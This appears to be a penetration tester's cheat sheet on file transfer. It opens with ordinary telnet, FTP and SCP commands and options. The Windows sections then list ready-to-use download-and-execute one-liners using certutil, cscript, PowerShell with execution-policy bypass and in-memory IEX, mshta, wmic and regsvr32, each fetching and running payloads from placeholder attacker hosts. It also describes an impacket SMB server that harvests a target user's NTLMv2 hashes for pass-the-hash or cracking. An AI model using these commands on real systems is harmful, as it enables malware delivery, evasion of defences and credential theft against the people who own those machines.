### Telnet

```bash
telnet ip_address
ls
PASV
TYPE A
STAT
get Download.txt
put Upload.txt
Exit
```

### FTP - File Transfer Protocol

#### commands

```bash
ftp ip_address
#enter username
#enter password

#print working directory
pwd

#list file in directory
ls

#change working directory
cd /dir/dir
cd ../dir
cd ..
cdup

#creating directory
mkdir new_dir

#removing directory
rmdir new_dir

#change transfer mode
ascii #suitable for transferring text data such as HTML files.
binary #

#download and upload a file
get Download.txt
put Upload.txt

#download upload multiple files
mget *.txt
mget file?.txt file?.zip
mput file.jpg file.jpg
mput *.zip

#delete file | multiple files
delete file.zip
mdelete *.zip

#rename a file
rename name.txt new_name.txt

# append remote file data
append new_data.sh old_data.sh

#change file permissions
chmod 777 file.sh
chmod +x file.sh

#to exit
bye
exit
quit
```

#### switches

```bash
-4	Use only IPv4 to contact any host.
-6	Use IPv6 only.
-e	Disables command editing and history support, if it was compiled into the ftp executable. Otherwise, it does nothing.
-p	Use passive mode for data transfers. Allows the use of ftp in environments where a firewall prevents connections from the outside world back to the client machine. Requires the ftp server to support the PASV command .
-i	Turns off interactive prompting during multiple file transfers.
-n	Restrains ftp from attempting auto-login upon initial connection. If auto-login is enabled, ftp checks the .netrc (see netrc ) file in the user’s home directory for an entry describing an account on the remote machine. If no entry exists, ftp prompts for the remote machine login name (the default is the user identity on the local machine), and, if necessary, prompt for a password and an account with which to login.
-g	Disables file name globbing.
-v	The verbose option forces ftp to show all responses from the remote server, as well as report on data transfer statistics.
-d	Enables debugging.
```

### SCP - Secure Copy Protocol

#### commands

```shell
scp <options> <source_path> <destination_path>
scp o s_path d_path

#specifying port with -P
scp -P 5562 file <username>@<remotehost_ip>:</path/to/file>
scp -P 5562 f? u@ip:r_file_path

# uploading a file
scp file <username>@<remotehost_ip>:</path/to/file>
scp file u@ip:r_file_path

# uploading multiple files
scp file1 file2 <username>@<remotehost_ip>:</path/to/directory>
scp f? f? u@ip:r_dir_path

# downloading a file
scp <username>@<remotehost_ip>:</path/to/file> </local/path/to/file>
scp u@ip:r_file_path l_file_path

# downloading multiple files
scp <username>@<remotehost_ip>:</path/directory/\{file.txt,file2.txt\}> .
scp u@ip:dir_path/\f?,f? .

# downloading a directory 
scp -r </path/to/directory> <username>@<ip_address>:</path/to/directory>
scp -r l_dir_path u@ip:r_dir_path
```

#### switches

```shell
-r      # transfer directory 
-v      # see the transfer details
-C      # copy files with compression
-l 800  # limit bandwidth with 800
-p      # preserving the original attributes of the copied files
-P      # connection port
-q      # hidden the output
```

### certutil - windows powershell

```powershell
# Multiple ways to download and execute files:
certutil -urlcache -split -f http://webserver/payload payload

# Execute a specific .dll:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

# Execute an .exe:
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

### cscript - windows powershell
```powershell
# Execute file from a WebDav server:
cscript //E:jscript \\IP\folder\payload.txt

# Download using wget.vbs
cscript wget.vbs http://IP/file.exe file.exe

# One liner download file from WebServer:
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
powershell -exec bypass -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\user\Desktop\file.exe')"

# Download from WebDAV Server:
powershell -exec bypass -f \\IP\folder\payload.ps1
```

### Windows mshta wmic regsvr32
```powershell
# Method 1
mshta vbscript:Close(Execute("GetObject(""script:http://IP/payload.sct"")"))

# Method 2
mshta http://IP/payload.hta

# Method 3 (Using WebDav)
mshta \\IP\payload.hta

#Download and execute XSL using wmic
wmic os get /format:"https://webserver/payload.xsl"


# Download and execute over a WebServer:
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

# Using WebDAV
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

# Powershell Cmdlet
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

# Powershell One-Line
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

# In Memory Execution
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
```

### SMB
```bash
# Set up a SMB server using smbserver.py from impacket
smbserver.py SHARE_NAME path/to/share

# From target Windows:
net view \\KALI_IP
(Should display the SHARE_NAME)

dir \\KALI_IP\SHARE_NAME
copy \\KALI_IP\SHARE_NAME\file.exe .

# Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
# can be usefull to PTH, or crack passwords

# Since Windows 10, you can't do anonymous smb server anymore
sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
net use Z: \\192.168.30.130\SDFR /user:peon peon
net use Z: /delete /y
```

```bash
impacket smbserver
net use z: \\attackerip\sharename
```


### ftpd

```shell
/etc/init.d/pure-ftpd
```

